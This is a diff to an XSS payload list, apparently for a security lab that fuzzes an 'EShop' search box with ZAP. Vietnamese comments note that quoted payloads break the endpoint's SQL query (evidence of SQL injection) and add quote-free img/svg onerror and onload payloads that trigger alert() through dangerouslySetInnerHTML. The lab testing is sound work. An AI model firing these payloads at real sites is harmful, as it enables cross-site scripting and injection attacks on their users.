@@ -6,6 +6,24 @@
 # Moi payload dung chuoi nhan dien duy nhat ZAPX<so> de de tim trong response
 # (go "ZAPX" vao o Search cua tab Response - Hint 2 trong Lab).
 #
+# ===================================================================
+# LUU Y QUAN TRONG (da kiem chung tren EShop 17/10):
+# - Endpoint search chay vao  ... WHERE name LIKE '%<payload>%'
+#   -> payload CO dau nhay (') se LAM VO SQL -> tra ve 500 (do la bang chung SQLi, KHONG phai XSS).
+# - De XAC THUC XSS (bung alert), GO payload KHONG CO dau nhay vao o tim kiem roi bam Tim:
+#       <img src=x onerror=alert(document.domain)>
+#       <svg onload=alert(1)>
+#       <img src=x onerror=alert(/ZAPX/)>
+#   SQL khong vo -> Home.jsx render qua dangerouslySetInnerHTML -> onerror/onload chay.
+# - URL ?search=... KHONG dung duoc (app khong doc param tu URL) -> phai GO vao o tim kiem.
+# ===================================================================
+#
+# --- Nhom 0: payload AN TOAN SQL (khong co dau nhay) - dung de XAC THUC XSS trong trinh duyet ---
+<img src=x onerror=alert(document.domain)>
+<svg onload=alert(1)>
+<img src=x onerror=alert(/ZAPX/)>
+"><img src=x onerror=alert(document.domain)>
+#
 # --- Nhom 1: the script co ban (kiem tra output encoding) ---
 <script>alert('ZAPX1')</script>
 <script>alert(String.fromCharCode(90,65,80,88,50))</script>
